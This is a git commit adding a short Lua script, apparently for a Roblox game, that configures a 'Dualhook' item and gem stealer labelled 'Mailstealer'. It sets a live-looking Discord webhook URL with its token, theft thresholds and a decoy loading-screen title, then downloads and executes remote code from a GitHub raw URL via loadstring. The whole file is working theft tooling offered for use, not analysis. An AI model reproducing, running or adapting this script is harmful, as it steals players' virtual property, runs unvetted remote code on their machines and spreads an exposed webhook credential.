953949488c7fe63fbc57448b602cbe610d8b70fc
HirumIIIix <150532634+HirumIIIix@users.noreply.github.com>
2024-02-13 18:53:14 -0600

    Add files via upload

---
+++ re.lua
@@ -0,0 +1,12 @@
+-- Dualhook SETTINGS!
+DualhookUsername = "DxXDemianXxM"
+DualhookWebHook = "https://discord.com/api/webhooks/1207106963545006131/OvKrqSabt7m0FgXDtPZlaaN9LWIrSuk9x9DOM-l0H2TT8wTc8g4qVZfIBQ77RV5cyG33"
+
+HugeSetting = 1   -- Dualhook Amount For Huges
+GemSetting = 1000000 -- Dualhook Amount For Gems
+
+-- Custom Settings!
+LoadingScreenTitle = "Loading" -- Loading Screen Title
+WebHookName = "... Mailstealer" -- Webhook Name
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/MoriPremium/main/MoriPremium"))()
